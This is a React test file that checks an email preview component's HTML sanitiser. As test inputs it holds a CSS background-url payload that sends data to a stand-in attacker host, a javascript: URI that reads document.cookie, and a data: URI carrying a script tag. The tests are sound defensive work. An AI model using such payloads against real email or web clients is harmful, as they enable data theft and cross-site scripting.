import { render } from '@testing-library/react'
import { HtmlEmailBody } from '@/components/emails/EmailPreview'

describe('EmailPreview Security', () => {
  it('should strip style attributes to prevent CSS exfiltration', () => {
    const maliciousHtml =
      '<div style="background:url(https://attacker.com/steal?data=secret)">Content</div>'
    const { container } = render(<HtmlEmailBody html={maliciousHtml} />)
    const div = container.querySelector('.email-html-preview div')
    // FE-CRITICAL-1 FIX: style attribute is now stripped from DOMPurify config,
    // preventing CSS-based data exfiltration via background: url(...)
    expect(div?.getAttribute('style')).toBeNull()
  })

  it('should strip javascript: URIs from href attributes', () => {
    const xssHtml = '<a href="javascript:alert(document.cookie)">Click me</a>'
    const { container } = render(<HtmlEmailBody html={xssHtml} />)
    const link = container.querySelector('.email-html-preview a')
    // DOMPurify strips javascript: protocol by default — the href is removed entirely
    // Verify the href is either absent (null) or does not contain javascript:
    const href = link?.getAttribute('href')
    expect(href === null || !href.includes('javascript:')).toBe(true)
  })

  it('should strip data: URIs that could exfiltrate content', () => {
    const dataUriHtml = '<a href="data:text/html,<script>alert(1)</script>">Click</a>'
    const { container } = render(<HtmlEmailBody html={dataUriHtml} />)
    const link = container.querySelector('.email-html-preview a')
    // DOMPurify strips data: URIs — the href is removed entirely
    const href = link?.getAttribute('href')
    expect(href === null || !href.includes('data:')).toBe(true)
  })

  it('should allow safe href attributes', () => {
    const safeHtml = '<a href="https://example.com">Safe link</a>'
    const { container } = render(<HtmlEmailBody html={safeHtml} />)
    const link = container.querySelector('.email-html-preview a')
    expect(link?.getAttribute('href')).toBe('https://example.com')
  })
})
